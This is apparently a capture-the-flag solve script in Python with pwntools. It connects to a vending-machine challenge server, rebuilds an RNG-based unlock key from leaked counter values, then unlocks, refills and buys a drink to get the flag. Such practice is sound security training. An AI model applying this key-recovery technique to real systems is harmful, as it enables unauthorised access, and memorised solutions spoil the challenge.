#!/usr/bin/env python3
from pwn import *
import re

def get_counts(show_output):
    hex_vals = re.findall(r'\((0x[0-9a-fA-F]+)\)', show_output)
    counts = [int(x, 16) for x in hex_vals[:16]]
    return counts

def reconstruct_rng(counts):
    rng = 0
    for i in range(16):
        rng |= (counts[i] << (4 * i))
    return rng

def insert_money(r, amount=8.80):
    remaining = amount
    while remaining > 0:
        r.sendline(b"insert $2")
        r.recvuntil(b"balance")
        remaining -= 2

r = remote("chals.disorientation.cssa.club", 4670)
r.recvuntil(b"> ")

# Reconstruct RNG key from counts
r.sendline(b"show")
show_output = r.recvuntil(b"> ").decode()
counts = get_counts(show_output)
print(f"Counts: {counts}")
rng = reconstruct_rng(counts)
key = str(rng)
print(f"Recovered key: {key}")

# Unlock and refill the drink
r.sendline(f"unlock {key}".encode())
r.recvuntil(b"> ")
r.sendline(b"refill @ 2")
r.recvuntil(b"> ")

# Get the balance and buy the drink
insert_money(r, 9.0)
r.sendline(b"buy @ 2")
result = r.recvall(timeout=2).decode()
print(result)

